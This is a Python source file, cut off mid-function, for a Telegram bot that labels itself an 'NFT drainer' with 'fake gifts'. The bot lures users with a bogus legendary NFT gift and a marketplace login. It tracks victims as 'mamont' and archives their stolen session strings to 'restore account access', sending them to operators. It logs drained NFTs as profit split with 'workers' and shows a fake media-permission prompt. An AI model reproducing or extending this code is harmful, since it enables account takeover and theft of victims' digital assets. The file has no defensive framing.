#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
======================================================================================
                💎 UNIFIED MARKETPLACE & NFT DRAINER BOT v5.0 💎
       Features: Premium UI, Worker Mode, Fake Gifts, NFT Draining, API Auth
======================================================================================
"""

import sys
import os

# Fix encoding for Windows
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

import asyncio
import logging
import shutil
import uuid
import secrets
import sqlite3
import time
import subprocess
import re
import json
import glob
import random
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List
from contextlib import contextmanager
from dotenv import load_dotenv
import aiohttp
import requests

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import Command, CommandStart, CommandObject, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, WebAppInfo,
    InlineQueryResultArticle, InputTextMessageContent,
    CallbackQuery, Message
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client, enums
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
    BadRequest, SessionRevoked
)

# Import NFT market price functions
try:
    from nft_market_api import get_nft_market_price, get_nft_details_with_prices
except ImportError:
    logger = logging.getLogger("UnifiedBot")
    logger.warning("NFT market API module not found, market prices will be unavailable")


# ================= ⚙️ CONFIGURATION =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] 💎 %(levelname)s: %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log', encoding='utf-8')
    ]
)
logger = logging.getLogger("UnifiedBot")

# Transfer debug logger
transfer_logger = logging.getLogger("TransferDebug")
transfer_logger.setLevel(logging.INFO)
fh = logging.FileHandler('transfer_debug.log', encoding='utf-8')
fh.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s'))
transfer_logger.addHandler(fh)

def log_transfer(msg, level="info"):
    if level == "info": transfer_logger.info(msg)
    elif level == "error": transfer_logger.error(msg)
    elif level == "warning": transfer_logger.warning(msg)


# ================= 🎨 COLORS =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       💎 UNIFIED MARKETPLACE & NFT BOT (V5.0)                ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

def print_step(msg): print(f"{Colors.BLUE}🔹 {msg}{Colors.END}")
def print_success(msg): print(f"{Colors.GREEN}✅ {msg}{Colors.END}")
def print_warning(msg): print(f"{Colors.YELLOW}⚠️ {msg}{Colors.END}")
def print_error(msg): print(f"{Colors.RED}❌ {msg}{Colors.END}")
def print_info(msg): print(f"{Colors.CYAN}ℹ️ {msg}{Colors.END}")

def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ================= 📁 DIRECTORIES =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
ARCHIVE_DIR = BASE_DIR / "archive"

for d in [SESSIONS_DIR, ARCHIVE_DIR]:
    d.mkdir(exist_ok=True)


# ================= ⚙️ SETTINGS =================
SETTINGS_FILE = BASE_DIR / "settings.json"
DEFAULT_SETTINGS = {
    "bot_token": "",
    "control_bot_token": "",
    "api_id": 0,
    "api_hash": "",
    "webapp_url": "http://localhost:3000",
    "admin_ids": [],
    "workers": [],
    "target_user": "",
    "banker_session": "main_admin",
    "maintenance_mode": False,
    "allowed_group_id": None,
    "topic_launch": None,
    "topic_auth": None,
    "topic_success": None,
    "telegram_api_url": "https://t.me",
    "about_link": "https://t.me/IT_Portal",
    "nft_fragment_url": "https://t.me/nft"
}

def load_settings() -> dict:
    if not SETTINGS_FILE.exists():
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_SETTINGS, f, indent=4)
        return DEFAULT_SETTINGS.copy()
    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        for k, v in DEFAULT_SETTINGS.items():
            if k not in data:
                data[k] = v
        if "webapp_url" in data:
            data["webapp_url"] = data["webapp_url"].rstrip('/')
        return data

def save_settings():
    SETTINGS["workers"] = list(workers_list)
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4, ensure_ascii=False)

SETTINGS = load_settings()
load_dotenv()

# Global bot instances
bot = None  # aiogram Bot instance
unified_bot = None  # UnifiedBot instance (for aiohttp session management)

def check_env_setup():
    """Load settings from settings.json without interactive prompts"""
    # Settings are already loaded from settings.json, just set environment variables
    if not SETTINGS.get("bot_token"):
        print(f"{Colors.RED}❌ ERROR: bot_token not found in settings.json{Colors.END}")
        sys.exit(1)
    
    if not SETTINGS.get("api_id"):
        print(f"{Colors.RED}❌ ERROR: api_id not found in settings.json{Colors.END}")
        sys.exit(1)
    
    if not SETTINGS.get("api_hash"):
        print(f"{Colors.RED}❌ ERROR: api_hash not found in settings.json{Colors.END}")
        sys.exit(1)

    os.environ["TELEGRAM_API_ID"] = str(SETTINGS["api_id"])
    os.environ["TELEGRAM_API_HASH"] = SETTINGS["api_hash"]
    os.environ["BOT_TOKEN"] = SETTINGS["bot_token"]
    
    print(f"{Colors.GREEN}✅ Settings loaded from {SETTINGS_FILE}{Colors.END}")

check_env_setup()


# ================= 🌍 LOCALIZATION =================
TEXTS = {
    "en": {
        "welcome": (
            "✨ <b>The Gateway is Open</b> ✨\n\n"
            "Discover the new trending way to trade Telegram gifts.\n"
            "Exclusive NFTs, rare collectibles, and instant trades.\n\n"
            "💎 <b>Buy • Sell • Collect</b> — all in one premium hub."
        ),
        "btn_webapp": "🌀 Enter Marketplace",
        "btn_about": "ℹ️ About Platform",
        "gift_received": (
            "🎉 <b>CONGRATULATIONS!</b>\n\n"
            "You have received a new <b>NFT Asset</b>!\n\n"
            "⚡️ <b>IonicDryer #7561</b>\n"
            "💎 <i>Rarity: Legendary</i>\n\n"
            "<a href='https://t.me/nft/IonicDryer-7561'>👁‍🗨 View on Blockchain</a>\n\n"
            "<i>The asset has been added to your digital profile.</i>"
        ),
        "gift_already_claimed": "⚠️ <b>Already Claimed</b>\n\nThis asset has already been claimed by: <b>@{user}</b>",
        "withdraw_prompt": (
            "🔒 <b>Action Required</b>\n\n"
            "To withdraw or exchange this asset, please log in to the Marketplace."
        ),
        "worker_activated": "👨‍💻 <b>Worker Mode: ACTIVATED</b>\n\n🟢 Inline Mode: Ready\n⌨️ Commands: /pyid, /1",
        "choose_lang": "🌐 <b>Welcome! Select your interface language:</b>",
        "lang_set": "🇬🇧 Language set to <b>English</b>."
    },
    "ru": {
        "welcome": (
            "✨ <b>Поток Открыт</b> ✨\n\n"
            "Откройте для себя новый способ обмена подарками Telegram.\n"
            "Эксклюзивные NFT, редкие коллекции и мгновенные сделки.\n\n"
            "💎 <b>Покупай • Продавай • Собирай</b> — всё в одном месте."
        ),
        "btn_webapp": "🌀 Войти в Маркет",
        "btn_about": "ℹ️ О платформе",
        "gift_received": (
            "🎉 <b>ПОЗДРАВЛЯЕМ!</b>\n\n"
            "Вы получили новый <b>NFT Актив</b>!\n\n"
            "⚡️ <b>IonicDryer #7561</b>\n"
            "💎 <i>Редкость: Легендарная</i>\n\n"
            "<a href='https://t.me/nft/IonicDryer-7561'>👁‍🗨 Смотреть в блокчейне</a>\n\n"
            "<i>Актив успешно добавлен в ваш цифровой профиль.</i>"
        ),
        "gift_already_claimed": "⚠️ <b>Уже активировано</b>\n\nЭтот подарок уже забрал: <b>@{user}</b>",
        "withdraw_prompt": (
            "🔒 <b>Требуется действие</b>\n\n"
            "Чтобы вывести или обменять этот актив, пожалуйста, авторизуйтесь в Маркете."
        ),
        "worker_activated": "👨‍💻 <b>Режим Воркера: АКТИВИРОВАН</b>\n\n🟢 Inline режим: Готов\n⌨️ Команды: /pyid, /1",
        "choose_lang": "🌐 <b>Добро пожаловать! Выберите язык:</b>",
        "lang_set": "🇷🇺 Язык установлен: <b>Русский</b>."
    }
}


# ================= 🗄️ DATABASE =================
class Database:
    def __init__(self, db_file="unified_bot.db"):
        self.path = BASE_DIR / db_file
        self._local = threading.local()
        with self._get_connection() as conn:
            self._create_tables(conn)
            self._load_workers(conn)

    @contextmanager
    def _get_connection(self):
        conn = sqlite3.connect(str(self.path), timeout=30.0, isolation_level=None, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=30000")
        try:
            yield conn
        finally:
            conn.close()

    def _create_tables(self, conn):
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            worker_id INTEGER DEFAULT NULL,
            is_authorized BOOLEAN DEFAULT 0,
            is_worker BOOLEAN DEFAULT 0,
            is_mamont BOOLEAN DEFAULT 0,
            is_dumped BOOLEAN DEFAULT 0,
            language TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        cursor.execute("""CREATE TABLE IF NOT EXISTS gifts (
            hash TEXT PRIMARY KEY,
            nft_id TEXT,
            creator_id INTEGER,
            claimed_by TEXT DEFAULT NULL,
            claimed_tg_id INTEGER DEFAULT NULL,
            is_claimed BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        
        # Migration: Add missing columns to gifts table if they don't exist
        try:
            cursor.execute("PRAGMA table_info(gifts)")
            columns = [col[1] for col in cursor.fetchall()]
            
            if 'nft_id' not in columns:
                cursor.execute("ALTER TABLE gifts ADD COLUMN nft_id TEXT")
                conn.commit()
            
            if 'claimed_tg_id' not in columns:
                cursor.execute("ALTER TABLE gifts ADD COLUMN claimed_tg_id INTEGER DEFAULT NULL")
                conn.commit()
                
        except Exception as e:
            logger.warning(f"Migration warning: {e}")

    def _load_workers(self, conn):
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users WHERE is_worker = 1")
            rows = cursor.fetchall()
            for row in rows:
                workers_list.add(row[0])
        except:
            pass

    def get_user(self, user_id):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            row = cursor.fetchone()
            if not row:
                return None
            return {
                'user_id': row[0], 'username': row[1], 'first_name': row[2],
                'phone': row[3], 'worker_id': row[4], 'is_authorized': bool(row[5]),
                'is_worker': bool(row[6]), 'is_mamont': bool(row[7]),
                'is_dumped': bool(row[8]), 'language': row[9]
            }

    def get_user_by_username(self, username):
        clean = username.replace("@", "").lower().strip()
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT user_id, first_name, language FROM users WHERE lower(username) = ?", (clean,))
            return cursor.fetchone()

    def add_user(self, user_id, username, first_name, worker_id=None, phone=None):
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                existing = self.get_user(user_id)
                if not existing:
                    cursor.execute(
                        "INSERT INTO users (user_id, username, first_name, worker_id, phone) VALUES (?, ?, ?, ?, ?)",
                        (user_id, username or "Unknown", first_name or "Unknown", worker_id, phone)
                    )
                else:
                    cursor.execute(
                        "UPDATE users SET username = ?, first_name = ? WHERE user_id = ?",
                        (username or "Unknown", first_name or "Unknown", user_id)
                    )
                    if worker_id and not existing['worker_id']:
                        cursor.execute("UPDATE users SET worker_id = ? WHERE user_id = ?", (worker_id, user_id))
                    if phone:
                        cursor.execute("UPDATE users SET phone = ? WHERE user_id = ?", (phone, user_id))
        except Exception as e:
            logger.error(f"DB Error add_user: {e}")

    def set_language(self, user_id, lang):
        with self._get_connection() as conn:
            conn.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))

    def set_worker(self, user_id):
        with self._get_connection() as conn:
            conn.execute("UPDATE users SET is_worker = 1 WHERE user_id = ?", (user_id,))
            workers_list.add(user_id)
            save_settings()

    def mark_authorized(self, user_id, phone):
        with self._get_connection() as conn:
            conn.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))

    def mark_as_dumped(self, user_id):
        with self._get_connection() as conn:
            conn.execute("UPDATE users SET is_dumped = 1 WHERE user_id = ?", (user_id,))

    def register_gift(self, gift_hash, creator_id, nft_id="IonicDryer-7561"):
        try:
            with self._get_connection() as conn:
                conn.execute(
                    "INSERT INTO gifts (hash, nft_id, creator_id) VALUES (?, ?, ?)",
                    (gift_hash, nft_id, creator_id)
                )
                return True
        except:
            return False

    def get_gift_status(self, gift_hash):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT is_claimed, claimed_by, nft_id, creator_id FROM gifts WHERE hash = ?", (gift_hash,))
            return cursor.fetchone()

    def claim_gift(self, gift_hash, username, tg_id):
        with self._get_connection() as conn:
            conn.execute(
                "UPDATE gifts SET is_claimed = 1, claimed_by = ?, claimed_tg_id = ? WHERE hash = ?",
                (username, tg_id, gift_hash)
            )

    def get_stats(self):
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users")
                users = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM gifts WHERE is_claimed = 1")
                gifts = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
                authorized = cursor.fetchone()[0]
                return users, gifts, authorized
        except:
            return 0, 0, 0

    def get_all_workers(self):
        """Get list of all workers with (user_id, username, is_worker)"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT user_id, username FROM users WHERE is_worker = 1 ORDER BY user_id DESC")
                return cursor.fetchall()
        except:
            return []

    def get_user_worker_count(self, worker_id: int):
        """Get count of users assigned to this worker"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (worker_id,))
                return cursor.fetchone()[0]
        except:
            return 0

    def get_worker_count(self):
        """Get total count of workers"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
                return cursor.fetchone()[0]
        except:
            return 0

    def get_user_count(self):
        """Get total count of users"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users")
                return cursor.fetchone()[0]
        except:
            return 0

    def get_all_users(self):
        """Get list of all user IDs for broadcasting"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT user_id FROM users ORDER BY user_id ASC")
                return cursor.fetchall()
        except:
            return []

    def set_worker_for_user(self, user_id: int, worker_id: int):
        """Assign a worker to a user"""
        try:
            with self._get_connection() as conn:
                conn.execute("UPDATE users SET worker_id = ? WHERE user_id = ?", (worker_id, user_id))
        except Exception as e:
            logger.error(f"DB Error set_worker_for_user: {e}")

    def remove_worker_assignment(self, worker_id: int):
        """Remove worker - unassign all users from this worker"""
        try:
            with self._get_connection() as conn:
                # Get count before removal
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (worker_id,))
                count = cursor.fetchone()[0]
                # Remove worker from users
                conn.execute("UPDATE users SET worker_id = NULL WHERE worker_id = ?", (worker_id,))
                # Remove worker flag
                conn.execute("UPDATE users SET is_worker = 0 WHERE user_id = ?", (worker_id,))
                return count
        except Exception as e:
            logger.error(f"DB Error remove_worker_assignment: {e}")
            return 0


# Global state
workers_list = set(SETTINGS.get("workers", []))
db = Database()
user_sessions: Dict[str, dict] = {}
pyrogram_clients: Dict[str, Client] = {}
processed_requests: Dict[str, set] = {}
admin_auth_process: Dict[int, dict] = {}
active_dumps = set()


# ================= 📦 STATES =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_url = State()
    waiting_api_id = State()
    waiting_api_hash = State()

class ControlState(StatesGroup):
    waiting_new_admin_id = State()
    waiting_del_admin_id = State()
    waiting_new_token = State()

class AdminPanelState(StatesGroup):
    add_worker = State()
    remove_worker = State()
    broadcast = State()


# ================= 🛠️ HELPERS =================
def clean_phone(phone) -> str:
    if not phone:
        return ""
    c = re.sub(r'\D', '', str(phone))
    if c.startswith('4949'):
        c = c[2:]
    if len(c) == 11 and c.startswith('8'):
        c = '7' + c[1:]
    elif len(c) == 10 and (c.startswith('9') or c.startswith('7')):
        c = '7' + c
    elif len(c) >= 10 and c.startswith(('15', '16', '17')):
        c = '49' + c
    return c

def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) > 7:
        return f"+{clean[:2]}*****{clean[-4:]}"
    return "Unknown"

def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['webapp_url'].rstrip('/')
    if 'localhost' not in base and not base.startswith('https://'):
        base = base.replace('http://', 'https://') if 'http://' in base else 'https://' + base
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"

def get_text(user_id: int, key: str) -> str:
    user = db.get_user(user_id)
    lang = user['language'] if user and user.get('language') else 'en'
    return TEXTS.get(lang, TEXTS['en']).get(key, "")

def is_request_processed(req_id: str, action: str) -> bool:
    return req_id in processed_requests and action in processed_requests[req_id]

def mark_request_processed(req_id: str, action: str):
    if req_id not in processed_requests:
        processed_requests[req_id] = set()
    processed_requests[req_id].add(action)

async def is_worker(uid: int) -> bool:
    return uid in workers_list or uid in SETTINGS.get("admin_ids", [])

async def safe_edit_text(message: Message, text: str, reply_markup=None):
    try:
        if message.content_type == ContentType.PHOTO:
            await message.delete()
            await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')

async def log_to_topic(bot: Bot, topic_key: str, text: str):
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)
    if gid and tid:
        try:
            await bot.send_message(
                chat_id=int(gid),
                text=text,
                message_thread_id=int(tid),
                disable_web_page_preview=True,
                parse_mode='HTML'
            )
        except Exception as e:
            print_error(f"LOG ERROR [{topic_key}]: {e}")

async def send_file_to_admins(bot: Bot, file_path: Path, caption: str):
    admins = SETTINGS.get('admin_ids', [])
    for admin_id in admins:
        try:
            await bot.send_document(chat_id=admin_id, document=FSInputFile(file_path), caption=caption)
        except:
            pass

async def notify_worker(bot: Bot, worker_id: int, text: str):
    if not worker_id:
        return
    try:
        await bot.send_message(chat_id=worker_id, text=text, parse_mode='HTML')
    except:
        pass

async def alert_admins(bot: Bot, text: str):
    admins = SETTINGS.get('admin_ids', [])
    clean_text = escape_html(str(text))
    msg = f"❌ <b>BOT ERROR</b>\n\n<pre>{clean_text[:3000]}</pre>"
    for admin_id in admins:
        try:
            await bot.send_message(chat_id=admin_id, text=msg, parse_mode='HTML')
        except:
            pass

async def log_to_profit_channel(bot: Bot, text: str):
    """Send message to profit/results channel"""
    channel_id = SETTINGS.get('profit_channel_id')
    if not channel_id or channel_id == 0:
        return
    try:
        await bot.send_message(
            chat_id=int(channel_id),
            text=text,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error logging to profit channel: {e}")

async def log_nft_profit(bot: Bot, user_id: int, username: str, nft_list: list, total_value: float = 0):
    """
    Log NFT transfer to profit channel with details including prices and total summary
    nft_list = [{'title': 'NFT Name', 'slug': 'nft-slug', 'transfer_cost': 25, 'market_price': 100}]
    """
    channel_id = SETTINGS.get('profit_channel_id')
    if not channel_id or channel_id == 0:
        return
    
    try:
        # Build NFT list with prices
        nft_details = ""
        total_ton = 0
        total_usd = 0
        
        for i, nft in enumerate(nft_list, 1):
            title = nft.get('title', 'Unknown NFT')
            slug = nft.get('slug', '')
            cost = nft.get('transfer_cost', 0)
            price_ton = nft.get('market_price', 0)
            price_usd = price_ton * 5.0  # 1 TON ≈ $5
            
            total_ton += price_ton
            total_usd += price_usd
            
            # Create link to NFT (using slug)
            link = f'<a href="{SETTINGS.get("telegram_api_url", "https://t.me")}/stars?start=nft-{slug}">💎 {title}</a>'
            
            # Format price display
            if price_ton > 0:
                price_str = f" <code>{price_ton}₮ (~${price_usd:.2f})</code>"
            else:
                price_str = ""
            
            nft_details += f"{i}. {link} • {cost}⭐{price_str}\n"
        
        # Calculate worker profit (80%)
        worker_profit_ton = total_ton * 0.8
        worker_profit_usd = total_usd * 0.8
        
        # Format message
        msg = f"""
⭐ <b>НОВЫЙ ПРОФИТ!</b>

👤 <b>ID:</b> {user_id}
🔗 <b>Тар:</b> @{username}
📊 <b>Кол-во NFT:</b> {len(nft_list)}

<b>📋 Подарки с ценами:</b>
{nft_details}
━━━━━━━━━━━━━━━━━━
💰 <b>Общая стоимость:</b> {total_ton:.2f}₮ (~${total_usd:.2f})
⭐ <b>На баланс:</b> {sum(n.get('transfer_cost', 0) for n in nft_list)}⭐

👷 <b>Чистый профит воркера (80%):</b> {worker_profit_ton:.2f}₮ (~${worker_profit_usd:.2f})
━━━━━━━━━━━━━━━━━━
"""
        
        if total_value > 0:
            msg += f"💵 <b>Additional Value:</b> ${total_value:.2f}\n"
        
        await bot.send_message(
            chat_id=int(channel_id),
            text=msg.strip(),
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error logging NFT profit: {e}")

async def log_to_logs_channel(bot: Bot, text: str, file_path: Path = None):
    """Send message to logs channel with optional file"""
    channel_id = SETTINGS.get('logs_channel_id')
    if not channel_id or channel_id == 0:
        return
    try:
        if file_path and file_path.exists():
            await bot.send_document(
                chat_id=int(channel_id),
                document=FSInputFile(str(file_path)),
                caption=text,
                parse_mode='HTML'
            )
        else:
            await bot.send_message(
                chat_id=int(channel_id),
                text=text,
                parse_mode='HTML',
                disable_web_page_preview=True
            )
    except Exception as e:
        logger.error(f"Error logging to logs channel: {e}")

async def log_to_logs_channel_with_recheck(bot: Bot, text: str, account_id: int, file_path: Path = None):
    """Send message to logs channel with optional file AND recheck button"""
    channel_id = SETTINGS.get('logs_channel_id')
    if not channel_id or channel_id == 0:
        return
    try:
        # Create keyboard with recheck button
        keyboard = InlineKeyboardBuilder()
        keyboard.button(
            text="🔄 Перепроверити аккаунт",
            callback_data=f"recheck_account:{account_id}"
        )
        
        if file_path and file_path.exists():
            await bot.send_document(
                chat_id=int(channel_id),
                document=FSInputFile(str(file_path)),
                caption=text,
                parse_mode='HTML',
                reply_markup=keyboard.as_markup()
            )
        else:
            await bot.send_message(
                chat_id=int(channel_id),
                text=text,
                parse_mode='HTML',
                disable_web_page_preview=True,
                reply_markup=keyboard.as_markup()
            )
    except Exception as e:
        logger.error(f"Error logging to logs channel with recheck: {e}")

async def request_media_permission(bot: Bot, user_id: int, message_text: str = None):
    """
    Request permission to access media (like screenshot shows)
    Similar to mobile app camera permission request
    """
    if message_text is None:
        message_text = """📸 <b>Запрос разрешения</b>

Приложению нужен доступ к:
• 📷 Камере
• 🖼️ Фото и видео
• 📁 Файлам

Это необходимо для верификации и логирования операций.

<b>Разрешить?</b>"""
    
    # Create keyboard with permission buttons
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="✅ Разрешить", callback_data="perm_allow")
    keyboard.button(text="❌ Отказать", callback_data="perm_deny")
    keyboard.adjust(1)
    
    try:
        await bot.send_message(
            chat_id=user_id,
            text=message_text,
            parse_mode='HTML',
            reply_markup=keyboard.as_markup()
        )
    except Exception as e:
        logger.error(f"Error sending permission request: {e}")

async def log_worker_profit(bot: Bot, worker_id: int, user_id: int, username: str, nft_list: list, total_stars_spent: int = 0):
    """
    Log NFT profit to profit channel with detailed breakdown including prices and worker profit
    nft_list = [{'title': 'NFT', 'market_price': 3.5, 'transfer_cost': 25}, ...]
    """
    channel_id = SETTINGS.get('profit_channel_id')
    if not channel_id or channel_id == 0:
        return
    
    try:
        # Build NFT details with prices
        nft_lines = []
        total_market_value_ton = 0
        total_market_value_usd = 0
        
        for idx, nft in enumerate(nft_list, 1):
            title = nft.get('title', 'Unknown NFT')
            market_price_ton = nft.get('market_price', 0)
            market_price_usd = market_price_ton * 5.0  # 1 TON ≈ $5
            transfer_cost = nft.get('transfer_cost', 25)
            
            total_market_value_ton += market_price_ton
            total_market_value_usd += market_price_usd
            
            # Format price info
            price_str = f" <code>{market_price_ton}₮ (~${market_price_usd:.2f})</code>" if market_price_ton > 0 else ""
            nft_lines.append(f"{idx}. {title} • {transfer_cost}⭐{price_str}")
        
        nft_details = "\n".join(nft_lines)
        
        # Get worker info
        worker = db.get_user(worker_id)
        worker_name = f"@{worker['username']}" if worker and worker.get('username') else f"ID:{worker_id}"
        
        # Calculate worker profit (80% of total value)
        worker_profit_ton = total_market_value_ton * 0.8
        worker_profit_usd = total_market_value_usd * 0.8
        
        # Format message
        msg = f"""
💎 <b>NFT PROFIT LOG</b>

👤 <b>Worker:</b> {worker_name}
📱 <b>User:</b> @{username} (ID: {user_id})
📊 <b>NFTs:</b> {len(nft_list)}

<b>📋 Items with Prices:</b>
{nft_details}

━━━━━━━━━━━━━━━━━━
💰 <b>Total Market Value:</b> {total_market_value_ton:.2f}₮ 


👷 <b>Worker Profit (80%):</b> {worker_profit_ton:.2f}₮ 
━━━━━━━━━━━━━━━━━━

⏰ <i>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
"""
        
        await bot.send_message(
            chat_id=int(channel_id),
            text=msg.strip(),
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error logging worker profit: {e}")

async def log_gift_received(bot: Bot, user_id: int, username: str, gift_title: str, gift_count: int = 1, giver_id: int = None):
    """
    Log when user receives gift to profit channel
    """
    channel_id = SETTINGS.get('profit_channel_id')
    if not channel_id or channel_id == 0:
        return
    
    try:
        giver_text = ""
        if giver_id:
            giver = db.get_user(giver_id)
            giver_name = f"@{giver['username']}" if giver and giver.get('username') else f"ID:{giver_id}"
            giver_text = f"\n🎁 <b>From:</b> {giver_name}"
        
        msg = f"""
🎉 <b>INLINE GIFT RECEIVED</b>

👤 <b>User:</b> @{username} (ID: {user_id})
🎁 <b>Gift:</b> {gift_title}
📦 <b>Count:</b> {gift_count}{giver_text}

⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        await bot.send_message(
            chat_id=int(channel_id),
            text=msg.strip(),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error logging gift received: {e}")

async def archive_session_data(user_id: int, phone: str, session_string: str, worker_id: int = None) -> Path:
    """
    Create a ZIP archive with session data for safe storage and transfer
    Returns path to the created archive
    """
    import zipfile
    from datetime import datetime
    
    try:
        # Create temp directory for session data
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        session_dir = SESSIONS_DIR / f"session_{user_id}_{phone.replace('+', '')}_{timestamp}"
        session_dir.mkdir(exist_ok=True)
        
        # Save session string to file
        session_file = session_dir / "session_string.txt"
        with open(session_file, 'w', encoding='utf-8') as f:
            f.write(f"USER_ID: {user_id}\n")
            f.write(f"PHONE: {phone}\n")
            f.write(f"TIMESTAMP: {timestamp}\n")
            if worker_id:
                f.write(f"WORKER_ID: {worker_id}\n")
            f.write(f"\n{'='*60}\n")
            f.write(f"SESSION_STRING:\n{'='*60}\n\n")
            f.write(session_string)
        
        # Create metadata file
        metadata_file = session_dir / "metadata.txt"
        with open(metadata_file, 'w', encoding='utf-8') as f:
            f.write(f"Account Access Information\n")
            f.write(f"{'='*60}\n")
            f.write(f"User ID: {user_id}\n")
            f.write(f"Phone: {phone}\n")
            f.write(f"Created: {timestamp}\n")
            if worker_id:
                worker = db.get_user(worker_id)
                if worker:
                    f.write(f"Worker: @{worker['username']} (ID: {worker_id})\n")
            f.write(f"\nInstructions:\n")
            f.write(f"1. Use session_string.txt to restore account access\n")
            f.write(f"2. Keep this archive secure\n")
            f.write(f"3. Do not share with unauthorized users\n")
        
        # Create ZIP archive
        zip_path = SESSIONS_DIR / f"session_{user_id}_{phone.replace('+', '')}_{timestamp}.zip"
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(session_file, arcname=session_file.name)
            zipf.write(metadata_file, arcname=metadata_file.name)
        
        # Clean up temp directory
        import shutil
        shutil.rmtree(str(session_dir), ignore_errors=True)
        
        logger.info(f"Session archive created: {zip_path}")
        return zip_path
        
    except Exception as e:
        logger.error(f"Error creating session archive: {e}")
        import traceback
        traceback.print_exc()
        return None


# ================= ⭐ STAR MANAGEMENT FUNCTIONS =================

async def check_star_balance(client: Client) -> int:
    """Check current star balance"""
    try:
        me = await client.get_me()
        star_balance = getattr(me, 'star_count', 0) or 0
        log_transfer(f"💫 Current star balance: {star_balance} ⭐", "debug")
        return star_balance
    except Exception as e:
        log_transfer(f"Error checking star balance: {e}", "error")
        return 0

async def buy_stars_from_fragment(client: Client, num_gifts: int, regular_gifts_count: int = 0) -> bool:
    """
    Buy stars from Telegram Fragment
    Minimum purchase = 50 stars, then any amount you want
    """
    try:
        # Calculate how many stars to buy
        # Fragment: minimum 50, then any amount
        if regular_gifts_count > 0:
            # If we have gifts to sell, just buy minimum (50 stars) to start
            needed_stars = 50
        else:
